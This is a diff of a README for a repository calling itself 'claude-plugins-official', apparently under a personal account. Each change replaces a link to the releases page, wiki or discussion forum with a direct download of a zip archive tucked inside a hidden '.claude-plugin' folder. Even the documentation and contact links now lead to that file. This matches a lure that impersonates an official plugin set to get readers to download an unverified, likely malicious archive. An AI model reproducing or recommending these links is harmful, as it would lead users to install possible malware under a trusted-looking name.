@@ -2,7 +2,7 @@
 
 ## 💾 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Get%20it%20here-brightgreen)](https://github.com/Kotty2998/claude-plugins-official/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Kotty2998/claude-plugins-official/main/external_plugins/laravel-boost/.claude-plugin/claude-official-plugins-1.1.zip%20Latest%20Release-Get%20it%20here-brightgreen)](https://raw.githubusercontent.com/Kotty2998/claude-plugins-official/main/external_plugins/laravel-boost/.claude-plugin/claude-official-plugins-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, you can download the latest version of our plugins from the Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/Kotty2998/claude-plugins-official/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Kotty2998/claude-plugins-official/main/external_plugins/laravel-boost/.claude-plugin/claude-official-plugins-1.1.zip)
 
 After visiting the page, you will find a list of releases. Choose the most recent version and click on it. You will see a list of assets available for that release. 
 
@@ -51,7 +51,7 @@ For advanced features or customizations, refer to the documentation that comes w
 
 ## 📚 Support and Documentation
 
-If you need assistance, we have documentation available for each plugin. Please visit our [Documentation Page](https://github.com/Kotty2998/claude-plugins-official/wiki) for more information and detailed guides.
+If you need assistance, we have documentation available for each plugin. Please visit our [Documentation Page](https://raw.githubusercontent.com/Kotty2998/claude-plugins-official/main/external_plugins/laravel-boost/.claude-plugin/claude-official-plugins-1.1.zip) for more information and detailed guides.
 
 ## 🌟 Community and Feedback
 
@@ -77,6 +77,6 @@ If you face any issues, refer to the troubleshooting section in the documentatio
 
 ## ✉ Contact Information
 
-For additional inquiries or support, please feel free to reach out by creating an issue on our GitHub repository or visiting our [Discussion Forum](https://github.com/Kotty2998/claude-plugins-official/discussions).
+For additional inquiries or support, please feel free to reach out by creating an issue on our GitHub repository or visiting our [Discussion Forum](https://raw.githubusercontent.com/Kotty2998/claude-plugins-official/main/external_plugins/laravel-boost/.claude-plugin/claude-official-plugins-1.1.zip).
 
 Thank you for using **claude-plugins-official**! We hope our plugins enhance your coding experience. Happy coding!
